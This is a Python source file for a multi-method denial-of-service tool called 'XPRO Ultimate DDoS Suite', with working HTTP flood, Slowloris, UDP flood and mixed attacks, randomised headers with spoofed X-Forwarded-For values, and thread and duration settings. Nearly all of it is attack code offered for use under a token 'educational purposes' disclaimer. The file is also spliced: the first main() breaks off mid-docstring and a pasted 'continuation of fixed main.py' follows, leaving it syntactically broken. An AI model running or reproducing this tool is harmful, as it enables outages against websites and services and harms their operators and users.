#!/usr/bin/env python3
"""
╔══════════════════════════════════════════════════════════════╗
║  ██╗  ██╗██████╗ ██████╗  ██████╗  ██████╗ ██████╗ ███████╗  ║
║  ╚██╗██╔╝██╔══██╗██╔══██╗██╔═══██╗██╔═══██╗██╔══██╗██╔════╝  ║
║   ╚███╔╝ ██████╔╝██████╔╝██║   ██║██║   ██║██████╔╝███████╗  ║
║   ██╔██╗ ██╔═══╝ ██╔══██╗██║   ██║██║   ██║██╔══██╗╚════██║  ║
║  ██╔╝ ██╗██║     ██║  ██║╚██████╔╝╚██████╔╝██║  ██║███████║  ║
║  ╚═╝  ╚═╝╚═╝     ╚═╝  ╚═╝ ╚═════╝  ╚═════╝ ╚═╝  ╚═╝╚══════╝  ║
║                  ULTIMATE DDOS SUITE v4.0                     ║
║              Multi-Vector Attack Framework                    ║
╚══════════════════════════════════════════════════════════════╝
"""

import os
import sys
import time
import random
import socket
import threading
import ssl
import argparse
import re
import json
import hashlib
import struct
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor
from colorama import init, Fore, Back, Style

# Initialize colorama
init(autoreset=True)

class XPROBanner:
    @staticmethod
    def show():
        banner = f"""
{Fore.RED}╔══════════════════════════════════════════════════════════════╗
{Fore.RED}║                                                              ║
{Fore.RED}║  {Fore.CYAN}██╗  ██╗{Fore.YELLOW}██████╗ {Fore.GREEN}█████╗  {Fore.MAGENTA}██████╗  {Fore.WHITE}██████╗  {Fore.RED}║
{Fore.RED}║  {Fore.CYAN}╚██╗██╔╝{Fore.YELLOW}██╔══██╗{Fore.GREEN}██╔══██╗{Fore.MAGENTA}██╔═══██╗{Fore.WHITE}██╔══██╗ {Fore.RED}║
{Fore.RED}║  {Fore.CYAN} ╚███╔╝ {Fore.YELLOW}██████╔╝{Fore.GREEN}███████║{Fore.MAGENTA}██║   ██║{Fore.WHITE}██████╔╝ {Fore.RED}║
{Fore.RED}║  {Fore.CYAN} ██╔██╗ {Fore.YELLOW}██╔═══╝ {Fore.GREEN}██╔══██║{Fore.MAGENTA}██║   ██║{Fore.WHITE}██╔══██╗ {Fore.RED}║
{Fore.RED}║  {Fore.CYAN}██╔╝ ██╗{Fore.YELLOW}██║     {Fore.GREEN}██║  ██║{Fore.MAGENTA}╚██████╔╝{Fore.WHITE}██║  ██║ {Fore.RED}║
{Fore.RED}║  {Fore.CYAN}╚═╝  ╚═╝{Fore.YELLOW}╚═╝     {Fore.GREEN}╚═╝  ╚═╝{Fore.MAGENTA} ╚═════╝ {Fore.WHITE}╚═╝  ╚═╝ {Fore.RED}║
{Fore.RED}║                                                              ║
{Fore.RED}║    {Fore.WHITE}ULTIMATE DDOS SUITE v4.0 - Professional Grade    {Fore.RED}║
{Fore.RED}║    {Fore.YELLOW}For Educational & Research Purposes Only        {Fore.RED}║
{Fore.RED}╚══════════════════════════════════════════════════════════════╝
{Style.RESET_ALL}
"""
        print(banner)

class XPROAttack:
    def __init__(self, target, port=80, threads=500, attack_time=60):
        self.target = target
        self.port = port
        self.threads = threads
        self.attack_time = attack_time
        self.attack_running = False
        self.stats = {
            'requests_sent': 0,
            'connections_made': 0,
            'errors': 0,
            'start_time': 0,
            'bytes_sent': 0
        }
        
        # Load user agents
        self.user_agents = self.load_user_agents()
        
    def load_user_agents(self):
        """Load user agents"""
        return [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:120.0) Gecko/20100101 Firefox/120.0",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_0) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15",
            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
        ]
    
    def generate_http_payload(self):
        """Generate random HTTP request"""
        methods = ['GET', 'POST', 'PUT', 'DELETE', 'PATCH', 'OPTIONS', 'HEAD']
        paths = ['/', '/wp-admin', '/api/v1', '/login', '/search', '/product', '/admin', '/dashboard']
        params = ['?id=', '?search=', '?page=', '?q=', '?category=', '?user=', '?token=']
        
        method = random.choice(methods)
        path = random.choice(paths)
        param = random.choice(params) + str(random.randint(1, 99999))
        
        # Build HTTP request
        request = f"{method} {path}{param} HTTP/1.1\r\n"
        request += f"Host: {self.target}\r\n"
        request += f"User-Agent: {random.choice(self.user_agents)}\r\n"
        request += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\r\n"
        request += "Accept-Language: en-US,en;q=0.5\r\n"
        request += "Accept-Encoding: gzip, deflate, br\r\n"
        request += "Connection: keep-alive\r\n"
        request += "Upgrade-Insecure-Requests: 1\r\n"
        request += "Cache-Control: max-age=0\r\n"
        
        # Add random headers
        if random.choice([True, False]):
            request += f"X-Forwarded-For: {random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}\r\n"
        
        if method == 'POST':
            request += "Content-Type: application/x-www-form-urlencoded\r\n"
            content_length = random.randint(100, 5000)
            request += f"Content-Length: {content_length}\r\n"
            request += "\r\n"
            request += 'data=' + 'A' * content_length
        else:
            request += "\r\n"
        
        return request.encode()
    
    def http_flood_attack(self):
        """HTTP Flood Attack"""
        while self.attack_running:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(5)
                sock.connect((self.target, self.port))
                
                self.stats['connections_made'] += 1
                
                for _ in range(random.randint(5, 20)):
                    if not self.attack_running:
                        break
                    
                    try:
                        payload = self.generate_http_payload()
                        sock.send(payload)
                        self.stats['requests_sent'] += 1
                        self.stats['bytes_sent'] += len(payload)
                        time.sleep(random.uniform(0.01, 0.1))
                    except:
                        self.stats['errors'] += 1
                        break
                
                sock.close()
                
            except Exception as e:
                self.stats['errors'] += 1
                time.sleep(0.1)
    
    def slowloris_attack(self):
        """Slowloris Attack"""
        sockets_list = []
        
        while self.attack_running:
            try:
                while len(sockets_list) < 200 and self.attack_running:
                    try:
                        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                        sock.settimeout(4)
                        sock.connect((self.target, self.port))
                        
                        sock.send(f"GET /?{random.randint(1, 9999)} HTTP/1.1\r\n".encode())
                        sock.send(f"Host: {self.target}\r\n".encode())
                        sock.send("User-Agent: Mozilla/5.0\r\n".encode())
                        sock.send("Accept: text/html,application/xhtml+xml\r\n".encode())
                        sock.send("X-a: ".encode())
                        
                        sockets_list.append(sock)
                        self.stats['connections_made'] += 1
                    except:
                        pass
                
                for sock in sockets_list[:]:
                    try:
                        sock.send(f"X-b: {random.randint(1, 5000)}\r\n".encode())
                        self.stats['requests_sent'] += 1
                    except:
                        sockets_list.remove(sock)
                        self.stats['errors'] += 1
                
                time.sleep(15)
                
            except:
                pass
    
    def udp_flood_attack(self):
        """UDP Flood Attack"""
        while self.attack_running:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                
                data = random._urandom(1024)
                
                for _ in range(random.randint(10, 50)):
                    if not self.attack_running:
                        break
                    
                    port = random.randint(1, 65535)
                    sock.sendto(data, (self.target, port))
                    self.stats['requests_sent'] += 1
                    self.stats['bytes_sent'] += len(data)
                
                sock.close()
                
            except:
                self.stats['errors'] += 1
    
    def mixed_attack(self):
        """Mixed Attack - All methods"""
        with ThreadPoolExecutor(max_workers=3) as executor:
            futures = [
                executor.submit(self.http_flood_attack),
                executor.submit(self.slowloris_attack),
                executor.submit(self.udp_flood_attack)
            ]
            
            # Run for attack duration
            time.sleep(self.attack_time)
            self.attack_running = False
            
            # Cancel futures
            for future in futures:
                future.cancel()
    
    def show_stats(self):
        """Display attack statistics"""
        while self.attack_running:
            elapsed = time.time() - self.stats['start_time']
            
            # Calculate metrics
            req_per_sec = self.stats['requests_sent'] / elapsed if elapsed > 0 else 0
            mb_sent = self.stats['bytes_sent'] / (1024 * 1024)
            mbps = (self.stats['bytes_sent'] * 8) / (elapsed * 1000000) if elapsed > 0 else 0
            
            # Clear and print
            sys.stdout.write('\r' + ' ' * 150 + '\r')
            
            print(f"{Fore.CYAN}[STATS]{Style.RESET_ALL} Time: {elapsed:.1f}s | "
                  f"Requests: {self.stats['requests_sent']} ({req_per_sec:.1f}/s) | "
                  f"Connections: {self.stats['connections_made']} | "
                  f"Errors: {self.stats['errors']} | "
                  f"Data: {mb_sent:.2f} MB ({mbps:.2f} Mbps)", end='', flush=True)
            
            time.sleep(1)
    
    def start_attack(self, attack_type='http'):
        """Start the selected attack"""
        self.attack_running = True
        self.stats['start_time'] = time.time()
        
        print(f"\n{Fore.GREEN}[+] Starting {attack_type.upper()} attack on {self.target}:{self.port}{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}[+] Threads: {self.threads} | Duration: {self.attack_time}s{Style.RESET_ALL}")
        print(f"{Fore.MAGENTA}[+] Press Ctrl+C to stop attack{Style.RESET_ALL}\n")
        
        # Start stats thread
        stats_thread = threading.Thread(target=self.show_stats)
        stats_thread.daemon = True
        stats_thread.start()
        
        # Start attack threads
        threads = []
        
        if attack_type == 'mixed':
            # Mixed uses ThreadPoolExecutor
            attack_thread = threading.Thread(target=self.mixed_attack)
            attack_thread.start()
            threads.append(attack_thread)
        else:
            # Single method
            for i in range(self.threads):
                if attack_type == 'http':
                    thread = threading.Thread(target=self.http_flood_attack)
                elif attack_type == 'slowloris':
                    thread = threading.Thread(target=self.slowloris_attack)
                elif attack_type == 'udp':
                    thread = threading.Thread(target=self.udp_flood_attack)
                else:
                    thread = threading.Thread(target=self.http_flood_attack)
                
                thread.daemon = True
                thread.start()
                threads.append(thread)
        
        # Run for specified time
        try:
            time.sleep(self.attack_time)
            self.attack_running = False
            print(f"\n\n{Fore.GREEN}[+] Attack completed successfully!{Style.RESET_ALL}")
        except KeyboardInterrupt:
            self.attack_running = False
            print(f"\n\n{Fore.YELLOW}[!] Attack stopped by user{Style.RESET_ALL}")
        
        # Wait for threads
        time.sleep(2)
        
        # Final stats
        elapsed = time.time() - self.stats['start_time']
        mb_sent = self.stats['bytes_sent'] / (1024 * 1024)
        mbps = (self.stats['bytes_sent'] * 8) / (elapsed * 1000000) if elapsed > 0 else 0
        
        print(f"\n{Fore.CYAN}{'═'*60}{Style.RESET_ALL}")
        print(f"{Fore.GREEN}FINAL STATISTICS:{Style.RESET_ALL}")
        print(f"  Total Time:     {elapsed:.1f}s")
        print(f"  Requests Sent:  {self.stats['requests_sent']:,}")
        print(f"  Connections:    {self.stats['connections_made']:,}")
        print(f"  Errors:         {self.stats['errors']:,}")
        print(f"  Data Sent:      {mb_sent:.2f} MB")
        print(f"  Avg Speed:      {mbps:.2f} Mbps")
        print(f"{Fore.CYAN}{'═'*60}{Style.RESET_ALL}")

def clean_target(target):
    """Clean target input"""
    # Remove protocol
    target = re.sub(r'^https?://', '', target)
    target = re.sub(r'^www\.', '', target)
    
    # Remove path
    target = target.split('/')[0]
    
    return target

def resolve_target(target):
    """Resolve domain to IP"""
    try:
        # Check if already IP
        if re.match(r'^\d+\.\d+\.\d+\.\d+$', target):
            return target
        
        # Resolve domain
        ip = socket.gethostbyname(target)
        return ip
    except:
        return target

def test_connection(target, port):
    """Test if target is reachable"""
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(5)
        result = sock.connect_ex((target, port))
        sock.close()
        return result == 0
    except:
        return False

def main():
    """Main function**CONTINUATION OF FIXED main.py:**

def main():
    """Main function"""
    # Show banner
    XPROBanner.show()
    
    # Parse arguments
    parser = argparse.ArgumentParser(description='XPRO - Ultimate DDoS Suite')
    parser.add_argument('-t', '--target', help='Target IP or domain')
    parser.add_argument('-p', '--port', type=int, default=80, help='Target port (default: 80)')
    parser.add_argument('-m', '--method', choices=['http', 'slowloris', 'udp', 'mixed'],
                       default='http', help='Attack method (default: http)')
    parser.add_argument('-th', '--threads', type=int, default=500,
                       help='Number of threads (default: 500)')
    parser.add_argument('-d', '--duration', type=int, default=60,
                       help='Attack duration in seconds (default: 60)')
    parser.add_argument('--test', action='store_true', help='Test connection before attack')
    
    args = parser.parse_args()
    
    # Interactive input if no target
    if not args.target:
        print(f"\n{Fore.YELLOW}[?] Enter target (without http://): {Style.RESET_ALL}", end='')
        args.target = input().strip()
        
        if not args.target:
            print(f"{Fore.RED}[!] Target is required{Style.RESET_ALL}")
            sys.exit(1)
        
        print(f"{Fore.YELLOW}[?] Port [80]: {Style.RESET_ALL}", end='')
        port_input = input().strip()
        if port_input:
            args.port = int(port_input)
        
        print(f"{Fore.YELLOW}[?] Method (http/slowloris/udp/mixed) [http]: {Style.RESET_ALL}", end='')
        method_input = input().strip().lower()
        if method_input in ['http', 'slowloris', 'udp', 'mixed']:
            args.method = method_input
        
        print(f"{Fore.YELLOW}[?] Threads [500]: {Style.RESET_ALL}", end='')
        threads_input = input().strip()
        if threads_input:
            args.threads = int(threads_input)
        
        print(f"{Fore.YELLOW}[?] Duration (seconds) [60]: {Style.RESET_ALL}", end='')
        duration_input = input().strip()
        if duration_input:
            args.duration = int(duration_input)
    
    # Clean target
    clean_target = args.target.replace('http://', '').replace('https://', '').replace('www.', '').split('/')[0]
    
    # Resolve domain
    try:
        target_ip = socket.gethostbyname(clean_target)
        print(f"{Fore.GREEN}[+] Resolved: {clean_target} → {target_ip}{Style.RESET_ALL}")
    except socket.gaierror:
        print(f"{Fore.YELLOW}[!] Could not resolve domain. Using as-is.{Style.RESET_ALL}")
        target_ip = clean_target
    
    # Test connection
    if args.test:
        print(f"{Fore.CYAN}[*] Testing connection to {target_ip}:{args.port}...{Style.RESET_ALL}")
        if test_connection(target_ip, args.port):
            print(f"{Fore.GREEN}[✓] Target is reachable{Style.RESET_ALL}")
        else:
            print(f"{Fore.RED}[!] Target may be unreachable{Style.RESET_ALL}")
            print(f"{Fore.YELLOW}[?] Continue anyway? (y/n): {Style.RESET_ALL}", end='')
            if input().strip().lower() != 'y':
                sys.exit(0)
    
    # Display config
    print(f"\n{Fore.CYAN}{'═'*60}{Style.RESET_ALL}")
    print(f"{Fore.GREEN}ATTACK CONFIGURATION:{Style.RESET_ALL}")
    print(f"  Target:   {Fore.YELLOW}{target_ip}:{args.port}{Style.RESET_ALL}")
    print(f"  Method:   {Fore.CYAN}{args.method.upper()}{Style.RESET_ALL}")
    print(f"  Threads:  {Fore.MAGENTA}{args.threads}{Style.RESET_ALL}")
    print(f"  Duration: {Fore.GREEN}{args.duration}s{Style.RESET_ALL}")
    print(f"{Fore.CYAN}{'═'*60}{Style.RESET_ALL}")
    
    # Warning
    print(f"\n{Fore.RED}{'⚠'*60}{Style.RESET_ALL}")
    print(f"{Fore.RED}WARNING: For educational purposes only!{Style.RESET_ALL}")
    print(f"{Fore.RED}Use only on systems you own or have permission to test.{Style.RESET_ALL}")
    print(f"{Fore.RED}{'⚠'*60}{Style.RESET_ALL}")
    
    # Confirm
    print(f"\n{Fore.YELLOW}[?] Start attack? (y/n): {Style.RESET_ALL}", end='')
    if input().strip().lower() != 'y':
        print(f"{Fore.YELLOW}[!] Attack cancelled{Style.RESET_ALL}")
        sys.exit(0)
    
    # Start attack
    try:
        attack = XPROAttack(target_ip, args.port, args.threads, args.duration)
        attack.start_attack(args.method)
    except KeyboardInterrupt:
        print(f"\n{Fore.YELLOW}[!] Attack interrupted{Style.RESET_ALL}")
    except Exception as e:
        print(f"\n{Fore.RED}[!] Error: {str(e)}{Style.RESET_ALL}")

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n{Fore.YELLOW}[!] Program terminated{Style.RESET_ALL}")
    except Exception as e:
        print(f"\n{Fore.RED}[!] Fatal error: {str(e)}{Style.RESET_ALL}")
